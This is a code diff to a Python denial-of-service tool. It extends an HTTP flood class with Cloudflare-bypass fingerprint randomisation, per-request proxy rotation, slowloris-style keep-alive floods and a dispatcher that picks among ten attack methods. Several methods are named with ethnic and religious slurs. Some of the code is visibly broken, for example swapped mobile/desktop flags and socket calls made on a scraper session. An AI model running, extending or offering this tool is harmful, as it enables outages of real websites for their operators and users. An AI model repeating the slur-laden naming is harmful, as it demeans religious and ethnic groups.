@@ -173,6 +173,19 @@ cf_description = [
     "V8",
 ]
 
+cf_browser = [
+    "chrome",
+    "firefox",
+]
+
+cf_platform = [
+    "linux",
+    "windows",
+    "darwin",
+    "android",
+    "ios",
+]
+
 # ATTACK PROHIBITION
 class BlackLists:
 
@@ -1179,6 +1192,26 @@ class HttpFlood(Thread):
         "Pragma": "no-cache",
         "Referrer": randchoice(self._referers) + parse.quote(self._target.human_repr())}
 
+    def get_cf_browser(self) -> dict:
+        
+        browser = randchoice(cf_browser)
+        platform = randchoice(cf_platform)
+        
+        mobile = False
+        desktop = False
+        
+        if (platform == "android") or (platform == "ios"):
+            mobile = True
+        else:
+            desktop = True
+            
+        return {
+            'browser': browser,
+            'platform': platform,
+            'desktop': mobile,
+            'mobile': desktop
+        }
+
 
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
@@ -1338,7 +1371,7 @@ class HttpFlood(Thread):
                 for _ in range(self._rpc):
                     if pro:
                         with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
-                                   proxies=pro.asRequest(), timeout=15) as res:
+                                   proxies=pro.asRequest(), timeout=200) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
@@ -1369,14 +1402,28 @@ class HttpFlood(Thread):
                 Tools.safe_close(s)
 
     def TANKIE_SPECIAL(self):
-        attack_method = int(random.randint(0,2))
+        attack_method = int(random.randint(0,9))
 
         if attack_method == 0:
             self.PAPIST()
-        elif  attack_method == 1:
+        elif attack_method == 1:
             self.CFTANKIE()
-        elif  attack_method == 2:
+        elif attack_method == 2:
             self.CFTANKIE2()
+        elif attack_method == 3:
+            self.CF_JIN_SAN_PANG()
+        elif attack_method == 4:
+            self.CF_NO_MORE_TANKIE_RAGHEADS()
+        elif attack_method == 5:
+            self.CFFUNDIE()
+        elif attack_method == 6:
+            self.CFFUNDIE2()
+        elif attack_method == 7:
+            self.RAGHEAD()
+        elif attack_method == 8:
+            self.CFPAPIST()
+        elif attack_method == 9:
+            self.LOIC_CF()
 
     def CF_JIN_SAN_PANG(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1385,37 +1432,35 @@ class HttpFlood(Thread):
             pro = randchoice(self._proxies)
 
         # AVB + SLOW
-        payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                 browser=self.get_cf_browser()) as s:
             try:
                 for _ in range(self._rpc):
-                    sleep(max(self._rpc / 1000, 1))
-                    while Tools.send(s, payload) and s.recv(1):
-                        keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                        Tools.send(s, keep)
-                        sleep(self._rpc / 15)
+                    
+                    attack_method = random.randint(0,1)
+                    if attack_method == 0:
+                        payload: bytes = self.generate_payload()
+                        sleep(max(self._rpc / 1000, 1))
+                        while Tools.send(s, payload) and s.recv(1):
+                            keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 20000))
+                            Tools.send(s, keep)
+                            sleep(self._rpc / 15)
+                    elif  attack_method == 1:
+                        if pro:
+                            with s.get(str(self._target),
+                                       proxies=pro.asRequest()) as res:
+                                REQUESTS_SENT += 1
+                                BYTES_SEND += Tools.sizeOfRequest(res)
+                        else:
+                            with s.get(str(self._target)) as res:
+                                REQUESTS_SENT += 1
+                                BYTES_SEND += Tools.sizeOfRequest(res)
             except:
                 sleep(random.randint(1,2))
             finally:
                 Tools.safe_close(s)
 
-        # BYPASS
-        global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-        with suppress(Exception), create_scraper() as s:
-            try:
-                for _ in range(self._rpc):
-                    sleep(max(self._rpc / 1000, 1))
-                    with s.get(str(self._target)) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-            except:
-                sleep(random.randint(1,2))
-            finally:
-                Tools.safe_close(s)
 
     def CF_NO_MORE_TANKIE_RAGHEADS(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1423,19 +1468,14 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
         s = None
-        payload: bytes = self.generate_payload()
-
-        attack_method = int(random.randint(0,2))
+ 
+        attack_method = random.randint(0,3)
         if attack_method == 0:
             # AVB + SLOW
-            with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
-                                                     delay=int(random.randint(10,12)), 
-                                                     captcha={
-		                                                'provider': '2captcha', 
-		                                                'api_key': 'you_2captcha_api_key', 
-	                                                }) as s:
+            with suppress(Exception), create_scraper() as s:
                 try:
                     for _ in range(self._rpc):
+                        payload: bytes = self.generate_payload()
                         sleep(max(self._rpc / 1000, 1))
                         while Tools.send(s, payload) and s.recv(1):
                             keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
@@ -1447,16 +1487,12 @@ class HttpFlood(Thread):
                     Tools.safe_close(s)        
         elif attack_method == 1:
             #CFB BYPASS(under attack mode)
-            with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
-                                                     delay=int(random.randint(10,12)), 
-                                                     captcha={
-		                                                'provider': '2captcha', 
-		                                                'api_key': 'you_2captcha_api_key', 
-	                                                }) as s:
+            with suppress(Exception), create_scraper() as s:
                 try:
                     sleep(5.01)
                     ts = time()
                     for _ in range(self._rpc):
+                        payload: bytes = self.generate_payload()
                         Tools.send(s, payload)
                         if time() > ts + 120: break
                 except:
@@ -1465,12 +1501,7 @@ class HttpFlood(Thread):
                     Tools.safe_close(s)
         elif attack_method == 2:
             # BYPASS
-            with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
-                                                     delay=int(random.randint(10,12)), 
-                                                     captcha={
-		                                                'provider': '2captcha', 
-		                                                'api_key': 'you_2captcha_api_key', 
-	                                                }) as s:
+            with suppress(Exception), create_scraper() as s:
                 try:
                     for _ in range(self._rpc):
                         sleep(max(self._rpc / 1000, 1))
@@ -1481,6 +1512,22 @@ class HttpFlood(Thread):
                     sleep(random.randint(1,2))
                 finally:
                     Tools.safe_close(s)
+        elif attack_method == 3:
+            # BYPASS
+            with suppress(Exception), create_scraper() as s:
+               try:
+                   for _ in range(self._rpc):
+                       payload: bytes = self.generate_payload()
+                       data = random._urandom(32)
+                       sleep(max(self._rpc / 1000, 1))
+                       while Tools.send(s, payload) and s.recv(1):
+                           data = random._urandom(32)
+                           Tools.sendto(s, data, self._target)
+                           sleep(self._rpc / 15)
+               except:
+                   sleep(random.randint(1,2))
+               finally:
+                   Tools.safe_close(s)    
 
     def CFFUNDIE(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1491,20 +1538,20 @@ class HttpFlood(Thread):
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
 
         s = None
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                 browser=self.get_cf_browser()) as s:
             try:
                 for _ in range(self._rpc):
                     if pro:
                         #http.request("GET", str(self._target), proxies=pro.asRequest(), headers=headersx, timeout=60)
                         #http.request("GET /?=" +str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=60)
-                        with s.get(str(self._target), headers=headersx, timeout=60) as res:
+                        with s.get(str(self._target), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                         with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
-                                   proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                                   proxies=pro.asRequest(), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1519,20 +1566,17 @@ class HttpFlood(Thread):
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
 
-        with suppress(Exception), create_scraper(interpreter='nodejs', delay=int(random.randint(10,15)), captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } ) as s:
+        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                 browser=self.get_cf_browser()) as s:
             try:
                 for _ in range(self._rpc):
                     #http.request("GET", str(self._target), headers=headersx, timeout=60)
                     #http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx, timeout=60)
-                    with s.get(str(self._target), headers=headersx, timeout=60) as res:
+                    with s.get(str(self._target), headers=self.get_headersx(), timeout=200) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=200) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1549,18 +1593,18 @@ class HttpFlood(Thread):
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
 
         s = None
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                 browser=self.get_cf_browser()) as s:
             try:
                 for _ in range(self._rpc):
                     if pro:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                        pro = randchoice(self._proxies)
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), headers=self.get_headersx(), proxies=pro.asRequest(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000), headers=headersx, proxies=pro.asRequest(), timeout=60),
-                                   proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1570,13 +1614,8 @@ class HttpFlood(Thread):
 
     def CFRAGHEAD(self):
         global REQUESTS_SENT, BYTES_SEND
-        
-        headersx = self.get_headersx()
 
-        with suppress(Exception), create_scraper(interpreter='nodejs', delay=int(random.randint(10,15)), captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } ) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
@@ -1598,7 +1637,7 @@ class HttpFlood(Thread):
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                     elif self._rpc % attack_method == 4:
-                        with s.get(str(self._target), headers=headersx, timeout=60) as res:
+                        with s.get(str(self._target), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1610,20 +1649,17 @@ class HttpFlood(Thread):
         global REQUESTS_SENT, BYTES_SEND
 
         pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
 
         #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
 
         with suppress(Exception), create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
-                    with s.get(str(self._target), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                    with s.get(str(self._target), headers=self.get_headersx(), proxies=randchoice(self._proxies).asRequest(), timeout=60) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), timeout=60) as res:
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=randchoice(self._proxies).asRequest(), timeout=60) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1639,10 +1675,9 @@ class HttpFlood(Thread):
             pro = randchoice(self._proxies)
 
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } ) as s:
+        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                 delay=int(random.randint(5,12)), 
+                                                 browser=self.get_cf_browser()) as s:
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
@@ -1692,26 +1727,20 @@ class HttpFlood(Thread):
 
         for _ in range(self._rpc):
             try:
-                with socks.socksocket() as s:
-                    s = socks.socksocket()
-                    s.connect((str(self._host), int(443)))
+                with suppress(Exception), create_scraper() as s:
+                    
+                    s.connect((str(self._target), int(443)))
                     s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    s = ctx.wrap_socket(s, server_hostname=self._target)
+                    s = ctx.wrap_socket(s, server_hostname=self._host)
                     s.send(str.encode(req))
                     try:
-                        ts = time()
                         for _ in range(100):
                             s.send(str.encode(req))
                             s.send(str.encode(req))
-                            if time() > ts + 120: break
                     except:
-                        sleep(random.randint(1,2))
-                    finally:
-                        pass
+                        Tools.safe_close(s)
             except:
-                pass
-            finally:
                 Tools.safe_close(s)
 
     def CF_ATTACK_RAGHEAD2(self):
@@ -1726,10 +1755,7 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } ) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                 sleep(5.01)
                 ts = time()
@@ -1753,10 +1779,7 @@ class HttpFlood(Thread):
 
         headersx = self.get_headersx()
 
-        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } ) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                 sleep(5.01)
                 ts = time()
@@ -1801,10 +1824,7 @@ class HttpFlood(Thread):
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         # Attacking
-        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } ) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                for _ in range(self._rpc):
                     if pro:
@@ -1919,11 +1939,7 @@ class HttpFlood(Thread):
 
     def PAPIST(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-      
-        proxy = pro.ip_port().split(":")
+
         req =  "GET / HTTP/1.1\r\nHost: " + self._host + "\r\n"
         req += "Cache-Control: no-cache\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
@@ -1936,8 +1952,11 @@ class HttpFlood(Thread):
         req += "Connection: Keep-Alive\r\n\r\n"
         for _ in range(self._rpc):
             try:
+                pro = None
+                if self._proxies:
+                    pro = randchoice(self._proxies)
+                    proxy = pro.ip_port().split(":")
                 with socks.socksocket() as s:
-                    s = socks.socksocket()
                     s.connect((str(self._host), int(443)))
                     s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -1978,23 +1997,23 @@ class HttpFlood(Thread):
     def AMAMI_CANON(self):
         global REQUESTS_SENT, BYTES_SEND
 
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-
         # Attacking
         try:
             scraper = None
             bypass_method = int(random.randint(0,2))
             if bypass_method == 0:
-                scraper = cfscrape.create_scraper(interpreter='nodejs', delay=10, captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } )
+                scraper = create_scraper(interpreter=randchoice(cf_description), 
+                                         delay=int(random.randint(5,12)), 
+                                         browser=self.get_cf_browser())
             else:
                 scraper = Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest())
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
+                
+                pro = None
+                if self._proxies:
+                    pro = randchoice(self._proxies)
+
                 attack_method = int(random.randint(0,3))
                 if self._rpc % attack_method == 0:
                      scraper.get(url, headers=self.get_headersx(), proxies=pro.asRequest(), timeout=60)
@@ -2011,9 +2030,6 @@ class HttpFlood(Thread):
 
     def AMAMI_CANON2(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
 
         s = None
 
@@ -2021,11 +2037,15 @@ class HttpFlood(Thread):
             bypass_method = int(random.randint(0,1))
             if bypass_method == 0:
                 #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-                with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
-		                            'provider': '2captcha', 
-		                            'api_key': 'you_2captcha_api_key', 
-	                                } ) as s:
+                with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                         delay=int(random.randint(5,12)), 
+                                                         browser=self.get_cf_browser()) as s:
                      for _ in range(self._rpc):
+
+                         pro = None
+                         if self._proxies:
+                             pro = randchoice(self._proxies)
+                             
                          sleep(max(self._rpc / 1000, 1))
                          attack_method = int(random.randint(0,3))
                          if self._rpc % attack_method == 0:
@@ -2047,6 +2067,11 @@ class HttpFlood(Thread):
             else:
                 with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as s:
                      for _ in range(self._rpc):
+                         
+                         pro = None
+                         if self._proxies:
+                             pro = randchoice(self._proxies)
+
                          sleep(min(self._rpc, 5) / 100)
                          attack_method = int(random.randint(0,3))
                          if self._rpc % attack_method == 0:
@@ -2083,7 +2108,9 @@ class HttpFlood(Thread):
             bypass_method = int(random.randint(0,1))
             if bypass_method == 0:
                 #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-                with suppress(Exception), create_scraper() as s:
+                with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                         delay=int(random.randint(5,12)), 
+                                                         browser=self.get_cf_browser()) as s:
                      for _ in range(self._rpc):
                          sleep(max(self._rpc / 1000, 1))
                          attack_method = int(random.randint(0,3))
